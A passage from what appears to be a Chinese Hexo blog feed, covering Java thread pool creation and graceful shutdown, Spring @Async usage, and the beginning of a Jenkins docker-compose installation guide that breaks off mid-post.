class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">THREAD_CORE_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">THREAD_MAX_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    System.out.println(<span class="hljs-string">&quot;------Start------&quot;</span>);<br><br>    <span class="hljs-comment">// 使用 ThreadFactoryBuilder 创建自定义线程名称的 ThreadFactory</span><br>    <span class="hljs-type">ThreadFactory</span> <span class="hljs-variable">namedThreadFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadFactoryBuilder</span>().setNameFormat(<span class="hljs-string">&quot;demo-pool-%d&quot;</span>).build();<br>    <span class="hljs-comment">// 创建线程池，其中任务队列需要结合实际情况设置合理的容量</span><br>    <span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(THREAD_CORE_SIZE,<br>                                                         THREAD_MAX_SIZE,<br>                                                         <span class="hljs-number">0L</span>,<br>                                                         TimeUnit.MILLISECONDS,<br>                                                         <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingDeque</span>&lt;&gt;(<span class="hljs-number">1024</span>),<br>                                                         namedThreadFactory,<br>                                                         <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.AbortPolicy());<br>    <span class="hljs-comment">// 新建 1000 个任务，每个任务是打印当前线程名称</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>        executor.execute(()-&gt;&#123;<br>            System.out.println(Thread.currentThread().getName());<br>        &#125;);<br>    &#125;<br>    <span class="hljs-comment">// 添加关闭线程池的钩子</span><br>    Runtime.getRuntime().addShutdownHook(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(()-&gt; shutdown(executor)));<br><br>    System.out.println(<span class="hljs-string">&quot;------done------&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 关闭线程池的钩子函数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> executorService</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">(ExecutorService executorService)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;graceful shutdown start...&quot;</span>);<br>    <span class="hljs-comment">// 第一步：使新任务无法提交</span><br>    executorService.shutdown();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 第二步：等待未完成任务结束</span><br>        <span class="hljs-keyword">if</span>(!executorService.awaitTermination(<span class="hljs-number">5</span>,TimeUnit.SECONDS))&#123;<br>            <span class="hljs-comment">// 第三步：取消当前执行的任务</span><br>            executorService.shutdownNow();<br>            <span class="hljs-comment">// 第四步：等待任务取消的响应</span><br>            <span class="hljs-keyword">if</span>(!executorService.awaitTermination(<span class="hljs-number">5</span>,TimeUnit.SECONDS))&#123;<br>                LOGGER.error(<span class="hljs-string">&quot;Thread pool did not terminate&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        <span class="hljs-comment">// 第五步：出现异常后，重新取消当前执行的任务</span><br>        executorService.shutdownNow();<br>        <span class="hljs-comment">// 设置本线程中断状态</span><br>        Thread.currentThread().interrupt();<br>    &#125;<br>    System.out.println(<span class="hljs-string">&quot;graceful shutdown end...&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
      <category>多线程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>异步调用（一）线程与线程池的创建</title>
    <link href="/2022/07/06/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%B8%80)/"/>
    <url>/2022/07/06/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<blockquote><p>异步编程允许多个事情同时发生， 当程序调用需要长时间运行的方法时，它不会阻塞当前的执行流程，程序可以继续运行，当方法执行完成时通知给主线程根据需要获取其执行结果或者失败异常的原因。使用异步编程可以大大提高我们程序的吞吐量，可以更好的面对更高的并发场景并更好的利用现有的系统资源，同时也会一定程度上减少用户的等待时间等。</p></blockquote><h1 id="一、-异步调用概念"><a href="#一、-异步调用概念" class="headerlink" title="一、 异步调用概念"></a>一、 异步调用概念</h1><p><code>异步调用</code> 是相对于<code>同步调用</code> 而言的，同步调用是指程序按预定顺序一步步执行，每一步必须等到上一步执行完后才能执行，异步调用则无需等待上一步程序执行完即可执行。 而在Java中异步调用的实现方式通常为——<code>多线程</code> </p><h1 id="二、Java-的-异步实现"><a href="#二、Java-的-异步实现" class="headerlink" title="二、Java 的 异步实现"></a>二、Java 的 异步实现</h1><h2 id="1-直接创建新线程"><a href="#1-直接创建新线程" class="headerlink" title="1. 直接创建新线程"></a>1. 直接创建新线程</h2><p>使用以下方式（lambda表达式需 <code>jdk 8</code>及以上）直接创建 Thread 对象并调用新线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;主线程方法===&gt;开始：&quot;</span>+System.currentTimeMillis());<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(()-&gt;&#123;<br>            System.out.println(<span class="hljs-string">&quot;异步线程方法===&gt;开始：&quot;</span>+System.currentTimeMillis());<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;异步线程方法===&gt;结束：&quot;</span>+System.currentTimeMillis());<br>        &#125;).start();<br>        Thread.sleep(<span class="hljs-number">1000</span>);<br>        System.out.println(<span class="hljs-string">&quot;主线程方法===&gt;结束：&quot;</span>+System.currentTimeMillis());<br>&#125;<br></code></pre></td></tr></table></figure><p>但这种方式并不推荐使用，因为存在两个显著问题：</p><ul><li><p><strong>创建的线程没有复用</strong>。我们知道频繁的线程创建与销毁是需要一部分开销的，而且示例里也没有限制线程的个数，如果使用不当可能会耗尽系统资源，从而导致生产事故。使用线程池可以解决该问题。</p></li><li><p><strong>无法获取异步任务执行结果</strong>。使用 FutureTask 解决该问题</p></li></ul><h2 id="2-使用线程池"><a href="#2-使用线程池" class="headerlink" title="2. 使用线程池"></a>2. 使用线程池</h2><h3 id="2-1-通过-Excutors-类创建线程池"><a href="#2-1-通过-Excutors-类创建线程池" class="headerlink" title="2.1 通过 Excutors 类创建线程池"></a>2.1 通过 Excutors 类创建线程池</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;主线程方法===&gt;开始：&quot;</span>+System.currentTimeMillis());<br><br>        <span class="hljs-comment">//创建线程池</span><br>        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executorService</span> <span class="hljs-operator">=</span> Executors.newSingleThreadExecutor();<br>        executorService.submit(()-&gt;&#123;<br>            System.out.println(<span class="hljs-string">&quot;异步线程方法===&gt;开始：&quot;</span>+System.currentTimeMillis());<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;异步线程方法===&gt;结束：&quot;</span>+System.currentTimeMillis());<br>        &#125;);<br>        <span class="hljs-comment">//回收线程池</span><br>        executorService.shutdown();<br><br>        Thread.sleep(<span class="hljs-number">1000</span>);<br>        System.out.println(<span class="hljs-string">&quot;主线程方法===&gt;结束：&quot;</span>+System.currentTimeMillis());<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="线程池类型"><a href="#线程池类型" class="headerlink" title="线程池类型"></a>线程池类型</h4><p><code>Executors</code> 类可以创建我们常用的四种线程池：</p><ul><li><p><code>newCachedThreadPool</code> ：创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程，不设上限，提交的任务将立即执行；</p></li><li><p><code>newFixedThreadPool</code> ：创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待；</p></li><li><p><code>newScheduledThreadPool</code> ：创建一个定长线程池，支持定时及周期性任务执行；</p></li><li><p><code>newSingleThreadExecutor </code>：创建一个单线程化的线程池执行任务，如果只是要异步执行，而非多线程并发，一般使用这个就行。</p></li></ul><p>线程池的submit方法：</p><p>线程池建立完毕之后，我们就需要往线程池提交任务。通过线程池的submit方法即可，submit方法接收两种<code>Runable</code> 和 <code>Callable</code> （这里采用的 <code>lambda</code> 表达式，方法体中若有返回值或异常抛出实现 <code>Callable</code> 的 <code>call()</code> 方法；否则实现 <code>Runable</code> 的 <code>run()</code> 方法)。</p><blockquote><p>实际上，以上创建线程池的方式并不推荐，因为Executors返回的线程池对象的弊端如下：</p><ul><li>FixedThreadPool和SingleThreadPool:<br>  允许的请求队列长度为 <code>Integer.MAX_VALUE</code> ，可能会堆积大量的请求，从而导致OOM;</li><li>CachedThreadPool:<br>  允许的创建线程数量为 <code>Integer.MAX_VALUE</code>，可能会创建大量的线程，从而导致OOM</li></ul></blockquote><h3 id="2-2-手动创建线程池-（推荐）"><a href="#2-2-手动创建线程池-（推荐）" class="headerlink" title="2.2 手动创建线程池 （推荐）"></a>2.2 手动创建线程池 （推荐）</h3><p>使用线程池实现类 <code>ThreadPoolExecutor</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ThreadPoolExecutor</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize,</span><br><span class="hljs-params">                          <span class="hljs-type">int</span> maximumPoolSize,</span><br><span class="hljs-params">                          <span class="hljs-type">long</span> keepAliveTime,</span><br><span class="hljs-params">                          TimeUnit unit,</span><br><span class="hljs-params">                          BlockingQueue&lt;Runnable&gt; workQueue,</span><br><span class="hljs-params">                          ThreadFactory threadFactory,</span><br><span class="hljs-params">                          RejectedExecutionHandler handler)</span> &#123; ... ... &#125;<br></code></pre></td></tr></table></figure><h4 id="线程池的参数"><a href="#线程池的参数" class="headerlink" title="线程池的参数"></a>线程池的参数</h4><p>根据以上定义，线程池有以下7大参数：</p><ul><li><code>corePoolSize</code> ：线程池中的常驻核心线程数</li><li><code>maximumPoolSize</code> ：线程池能够容纳同时执行的最大线程数，此值必须大于等于1</li><li><code>keepAliveTime</code> ：多余的空闲线程的存活时间</li><li><code>unit</code> ：keepAliveTime 的时间单位</li><li><code>workQueue</code> ：任务队列，被提交但尚未被执行的任务。</li><li><code>threadFactory</code> ：表示生成线程池中工作线程的线程工厂，用于创建线程一般用默认</li><li><code>handler</code>：拒绝策略，表示当队列满了并且工作线程大于等于线程池的最大线程数</li></ul><h4 id="线程池工作原理"><a href="#线程池工作原理" class="headerlink" title="线程池工作原理"></a>线程池工作原理</h4><ol><li>当线程数 &gt; <code>corePoolSize</code> 时，多余线程将转入阻塞队列；</li><li>阻塞队列也满了之后线程数将扩容到 <code>maximumPoolSize</code> ；</li><li>当 <code>maximumPoolSize</code> 也满了之后将采取拒绝策略 <code>handler</code> ；</li><li>当线程数小了之后，根据设定的空闲线程存活时间将线程总容量回缩到 <code>corePoolSize</code></li></ol><h4 id="使用线程工厂创建线程池"><a href="#使用线程工厂创建线程池" class="headerlink" title="使用线程工厂创建线程池"></a>使用线程工厂创建线程池</h4><p>线程工厂需要先借助谷歌工具库 <code>guava</code> ，在<code>pom.xml</code> 中引入如下依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.google.guava<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>guava<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>20.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用线程工厂自定义创建线程池</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">THREAD_CORE_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">THREAD_MAX_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;------Start------&quot;</span>);<br>        <span class="hljs-comment">// 使用 ThreadFactoryBuilder 创建自定义线程名称的 ThreadFactory</span><br>        <span class="hljs-type">ThreadFactory</span> <span class="hljs-variable">namedThreadFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadFactoryBuilder</span>().setNameFormat(<span class="hljs-string">&quot;demo-pool-%d&quot;</span>).build();<br><br>        <span class="hljs-comment">// 创建线程池，其中任务队列需要结合实际情况设置合理的容量</span><br>        <span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(THREAD_CORE_SIZE,<br>                THREAD_MAX_SIZE,<br>                <span class="hljs-number">0L</span>,<br>                TimeUnit.MILLISECONDS,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingDeque</span>&lt;&gt;(<span class="hljs-number">1024</span>),<br>                namedThreadFactory,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.AbortPolicy());<br><br>        <span class="hljs-comment">// 新建 1000 个任务，每个任务是打印当前线程名称</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>            executor.execute(()-&gt;&#123;<br>                System.out.println(Thread.currentThread().getName());<br>            &#125;);<br>        &#125;<br>        <span class="hljs-comment">// 优雅关闭线程池</span><br>        executor.shutdown();<br>        executor.awaitTermination(<span class="hljs-number">1000L</span>, TimeUnit.SECONDS);<br>        <span class="hljs-comment">// 任务执行完毕后打印done</span><br>        System.out.println(<span class="hljs-string">&quot;------Done------&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里用到了线程池的优雅关闭，详细内容在 <a href="2022/07/08/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%BA%8C)/">异步调用（二）线程池的优雅关闭</a> </p></blockquote><h2 id="3-Async注解"><a href="#3-Async注解" class="headerlink" title="3. @Async注解"></a>3. @Async注解</h2><h3 id="3-1-开启异步功能支持"><a href="#3-1-开启异步功能支持" class="headerlink" title="3.1 开启异步功能支持"></a>3.1 开启异步功能支持</h3><p>使用 <code>@EnableAsync</code> 来开启异步任务支持，<code>@EnableAsync</code> 注解可以直接放在SpringBoot启动类上，也可以单独放在其他配置类上，主要是为了扫描范围包下所有的 <code>@Async</code> 注解</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@EnableAsync</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncConfiguraion</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-2-标记异步方法"><a href="#3-2-标记异步方法" class="headerlink" title="3.2 标记异步方法"></a>3.2 标记异步方法</h3><p>在需要异步调用的方法上添加 <code>@Async</code> 注解，如果在类上标注，代表该类的所有方法都需要异步处理，但并不推荐这么做（需注意方法所在类需要注册为spring组件）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncTask</span> &#123;<br> <br>    <span class="hljs-meta">@Async</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doTask1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        Thread.sleep(<span class="hljs-number">2000</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        log.info(<span class="hljs-string">&quot;task1 cost &#123;&#125; ms&quot;</span> , t2-t1);<br>    &#125;<br> <br>    <span class="hljs-meta">@Async</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doTask2</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        Thread.sleep(<span class="hljs-number">3000</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        log.info(<span class="hljs-string">&quot;task2 cost &#123;&#125; ms&quot;</span> , t2-t1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-3-调用异步方法"><a href="#3-3-调用异步方法" class="headerlink" title="3.3 调用异步方法"></a>3.3 调用异步方法</h3><p>调用异步方法同样需要在Spring注册的组件中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/async&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> AsyncTask asyncTask;<br> <br>    <span class="hljs-meta">@RequestMapping(&quot;/task&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">task</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        asyncTask.doTask1();<br>        asyncTask.doTask2();<br>        Thread.sleep(<span class="hljs-number">1000</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        log.info(<span class="hljs-string">&quot;main cost &#123;&#125; ms&quot;</span>, t2-t1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p> <code>@Async</code>注解，在默认情况下用的是<strong>SimpleAsyncTaskExecutor线程池，该线程池不是真正意义上的线程池</strong> 。使用此线程池无法实现线程重用，每次调用都会新建一条线程。若系统中不断的创建线程，最终耗尽系统资源，引发<code>OOM</code>，因此该注解的真正使用场景需要自定义线程池，如何实现在 <a href="2022/07/10/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%B8%89)/">异步调用（三）@Async自定义线程池</a> </p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
      <category>多线程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jenkins安装配置</title>
    <link href="/2022/07/04/Jenkins%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/"/>
    <url>/2022/07/04/Jenkins%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/</url>
    
    <content type="html"><![CDATA[<h1 id="Jenkins安装配置"><a href="#Jenkins安装配置" class="headerlink" title="Jenkins安装配置"></a>Jenkins安装配置</h1><blockquote><p>2023&#x2F;7&#x2F;3 更新</p><ul><li>jenkins最新版本由于其他影响大部分插件无法安装，可下列参考 ：</li><li>[ docker环境下安装最新版本jenkins](<a href="https://blog.csdn.net/xiezuozhen/article/details/129329626?ops_request_misc=%7B%22request_id%22:%22168820093716800213062283%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&amp;request_id=168820093716800213062283&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~times_rank-1-129329626-null-null.142%5Ev88%5Ekoosearch_v1,239%5Ev2%5Einsert_chatgpt&amp;utm_term=docker">https://blog.csdn.net/xiezuozhen/article/details/129329626?ops_request_misc=%7B%22request%5Fid%22%3A%22168820093716800213062283%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168820093716800213062283&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~times_rank-1-129329626-null-null.142^v88^koosearch_v1,239^v2^insert_chatgpt&amp;utm_term=docker</a> jenkins安装&amp;spm&#x3D;1018.2226.3001.4187)</li></ul></blockquote><h2 id="1-docker-compose-启动-Jenkins"><a href="#1-docker-compose-启动-Jenkins" class="headerlink" title="1. docker-compose 启动 Jenkins"></a>1. docker-compose 启动 Jenkins</h2><p>创建 <code>jenkins</code> 目录，在目录下编辑 <code>docker-compose.yml</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /opt/docker/jenkins &amp;&amp; <span class="hljs-built_in">cd</span> /opt/docker/jenkins<br><span class="hljs-comment">#创建data目录并赋权，不然会启动失败</span><br><span class="hljs-built_in">mkdir</span> data &amp;&amp; <span class="hljs-built_in">chmod</span> 777 data<br><span class="hljs-comment">#创建docker-compose配置</span><br>vim docker-compose.yml<br></code></pre></td></tr></table></figure><p>内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>    <span class="hljs-attr">jenkins:</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">jenkinsci/blueocean</span>  <span class="hljs-comment">#jenkins镜像</span><br>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">jenkins</span>  <span class="hljs-comment">#容器名</span><br>        <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attr">environment:</span><br>            <span class="hljs-attr">JAVA_OPTS :</span> <span class="hljs-string">&quot;-server -Xms1024m -Xmx1024m -XX:PermSize=256m -XX:MaxPermSize=512m&quot;</span><br>        <span class="hljs-attr">ports:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;8998:8080&#x27;</span>  <span class="hljs-comment">#发布端口</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;50000:50000&#x27;</span>  <span class="hljs-comment">#基于 JNLP 的 Jenkins 代理通过 TCP 端口 50000 与 Jenkins master 进行通信</span><br>        <span class="hljs-attr">volumes:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">./data:/var/jenkins_home</span>  <span class="hljs-comment">#工作目录挂载到外部服务器</span><br></code></pre></td></tr></table></figure><p>执行命令启动 <code>jenkins</code> 容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d jenkins<br></code></pre></td></tr></table></figure><h2 id="2-Jenkins-安装"><a href="#2-Jenkins-安装" class="headerlink" title="2. Jenkins 安装"></a>2. Jenkins 安装</h2><p>通过 <code>ip:端口</code> 访问web端进行安装</p><p><img src="/../blog-assets/Jenkins%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1657024634835.png" alt="1657024634835"></p><p>查看日志获取初始密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /opt/docker/jenkins/data/secrets/initialAdminPassword <br></code></pre></td></tr></table></figure><p>选择推荐插件，等待安装完成</p><p><img src="/../blog-assets/Jenkins%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%9E%E7%8E%B0CI/1657025555952.png" alt="1657025555952"></p><p>创建一个新的管理员账户</p><p><img 